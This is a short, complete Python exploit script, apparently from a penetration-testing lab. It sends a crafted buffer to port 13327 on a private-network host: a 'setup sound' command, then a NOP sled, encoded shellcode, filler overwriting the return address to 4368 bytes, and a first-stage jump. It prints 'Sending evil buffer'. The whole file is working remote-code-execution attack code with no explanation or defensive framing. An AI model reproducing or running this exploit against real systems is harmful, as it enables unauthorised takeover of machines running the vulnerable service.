#!/usr/bin/python3
import socket

host = "192.168.173.44"

shellcode =  b""
shellcode += b"\xda\xc1\xb8\x0d\xf0\xc7\x76\xd9\x74\x24\xf4"
shellcode += b"\x5e\x2b\xc9\xb1\x12\x83\xee\xfc\x31\x46\x13"
shellcode += b"\x03\x4b\xe3\x25\x83\x62\xd8\x5d\x8f\xd7\x9d"
shellcode += b"\xf2\x3a\xd5\xa8\x14\x0a\xbf\x67\x56\xf8\x66"
shellcode += b"\xc8\x68\x32\x18\x61\xee\x35\x70\xb2\xb8\xb1"
shellcode += b"\x2d\x5a\xbb\x3d\x28\xa2\x32\xdc\x82\xb2\x14"
shellcode += b"\x4e\xb1\x89\x96\xf9\xd4\x23\x18\xab\x7e\xd2"
shellcode += b"\x36\x3f\x16\x42\x66\x90\x84\xfb\xf1\x0d\x1a"
shellcode += b"\xaf\x88\x33\x2a\x44\x46\x33"

nops = b"\x90" * 8

filler = b"\x41" * (4368 - len(shellcode) - len(nops))

eip = b"\x96\x45\x13\x08"

first_stage = b"\x83\xc0\x0c\xff\xe0\x90\x90"

buffer = b"\x11(setup sound " + nops + shellcode + filler + eip + first_stage + b"\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*]Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*]Payload Sent !")